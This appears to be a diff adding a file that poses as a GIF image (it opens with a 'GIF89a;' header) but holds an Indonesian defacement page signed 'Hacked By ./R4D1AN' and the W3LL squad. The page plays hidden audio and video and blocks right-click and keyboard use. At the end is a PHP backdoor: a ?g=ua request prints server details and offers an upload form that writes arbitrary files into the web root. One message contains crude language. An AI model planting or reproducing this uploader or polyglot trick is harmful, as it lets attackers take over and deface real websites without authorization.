@@ -1,0 +1,220 @@
+GIF89a;
+  <script language="JavaScript">
+
+<!--
+
+function FP_playSound(path) {//v1.0
+
+ var b,d=document,e,es,i,se="<EMBED SRC='"+path+"' HIDDEN=TRUE LOOP=FALSE AUTOSTART=TRUE>";            
+
+ if(d.body)b=d.body;    if(d.getElementsByTagName) { es=d.getElementsByTagName('embed')        
+
+ for(i=0;i<es.length;i++) { e=es(i); if( e.src==path ) { if(e.removeNode) e.removeNode();
+
+ break; } } if(b&&b.insertAdjacentHTML) b.insertAdjacentHTML("beforeend",se); }
+
+}
+
+// -->
+
+</script> 
+
+ </head> 
+<div align="center" style="margin:15px 0px 0px 0px"><script type="text/javascript" src="http://localtimes.info/clock.php?continent=Asia&country=Indonesia&city=Jakarta&widget_number=102&cp3_Hex=FFB200&cp2_Hex=FFFFFF&cp1_Hex=000080&ham=1&fwdt=130"></script><noscript><a href="http://www.success-4all.com/">Info sukses untuk semua</a></noscript></div>
+ 
+<body onload="FP_playSound(/*url*/'https://f.top4top.net/m_10613fpfc0.mp3')" oncontextmenu="return false" onkeydown="return false" onmousedown="return false" bgcolor="white">
+
+  <meta name="description" content="#Indonesian_Defacer">
+
+  <link rel="icon" type="https://d.top4top.net/p_1013ib0880.jpg"> 
+
+  <meta property="og:image" content="https://d.top4top.net/p_1013ib0880.jpg">
+
+<center>
+
+<title>Visited By ./R4D14N</title>
+
+
+
+<body bgcolor="white" text="red, white, orange">
+
+
+
+<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false"></body>
+
+
+
+<body onkeydown="return false">
+
+
+
+<center>
+
+
+
+<link href="https://fonts.googleapis.com/css?family=Arvo|Electrolize|Iceberg" rel="stylesheet">
+
+
+
+<link href='https://fonts.googleapis.com/css?family=Roboto+Mono' rel="stylesheet" type="text/css">
+
+
+
+<link href='https://fonts.googleapis.com/css?family=Jolly+Lodger' rel='stylesheet' type='text/css'>
+
+
+
+<iframe width="1" height="0" src="https://www.youtube.com/embed/G-YNNJIe2Vk?rel=0&autoplay=1" 
+
+
+
+
+
+
+
+frameborder="0" allowfullscreen></iframe >
+
+
+
+<center>
+
+
+
+<br><br><br><br>
+
+
+
+<img  width="500" 
+
+
+
+
+
+
+
+src="https://d.top4top.net/p_1013ib0880.jpg">
+
+
+
+<br><br>
+
+
+
+<font face="Roboto Mono" color=black size="4">Hacked By ./R4D1AN
+
+
+
+<font face="Roboto Mono"  color=black  size="3" ><br><br>Think of it as a beginner<br>
+
+
+
+so this world will be open to you<br>
+
+
+
+From noobers<br>
+
+
+
+to extraordinary people!<br>
+
+
+
+<br><br>
+
+
+
+<font color="red" face="Roboto Mono" size="3">[ Greetz ]<br></font>
+
+
+
+<font color="black">|</font><marquee direction=left behavior=alternate scrollamount="2" 
+
+
+
+
+
+
+
+scrolldelay="50" width="50%"><font color="black" size="3" face="Roboto Mono">Nick WELL squad
+
+George74| W3LL | Nurmala | Mr.Maniz | /4MN3SI4\ | BLACK BART 06 | Mr. AK13XWS(AS) |  XnD0yZshHH | SUMO IRENG  | ./B4D#R4BB1T | DeXONE  | LC523 | Z0y0n3-cripzGangs | Shinta17 | ./RADIAN | Lollz | Depars |?M.A?| FALKA | Software7 | Nopal | INTECT_
+| ./ELLIOT | Cyto | ./Pejuang404 | Mr.BOTLINE | InYourS!t3 | N00B T3RS4KITI
+
+
+
+
+
+
+
+
+Friends</font></marquee><font color="black">|</font><br><br>
+
+
+
+</small><br>
+
+
+
+<font face="Roboto Mono" size="3" color=red>Copyright 2018 | W3LL SQUAD OFFICIAL</font>
+
+
+
+</center>
+
+
+
+</body>
+
+
+
+<head>
+
+
+
+<style>
+
+
+
+.drop { position: absolute; width: 3;  filter: flipV(), flipH(); font-size: 40; color: blue }
+
+
+
+</style>
+
+
+
+</body>
+
+
+
+</html>
+<?php
+if($_GET['g'] == 'ua')
+{
+echo "<b>".php_uname()."</b><br>";
+echo "<form method='post' enctype='multipart/form-data'>
+	  <input type='file' name='idx_file'>
+	  <input type='submit' name='upload' value='upload'>
+	  </form>";
+$root = $_SERVER['DOCUMENT_ROOT'];
+$files = $_FILES['idx_file']['name'];
+$dest = $root.'/'.$files;
+if(isset($_POST['upload'])) {
+	if(is_writable($root)) {
+		if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
+			$web = "http://".$_SERVER['HTTP_HOST']."/";
+			echo "sukses upload -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
+		} else {
+			echo "gagal upload di document root.";
+		}
+	} else {
+		if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
+			echo "sukses tusbol <b>$files</b> di folder ini";
+		} else {
+			echo "gagal upload gagal ngentod !";
+		}
+	}
+}
+}
+?>
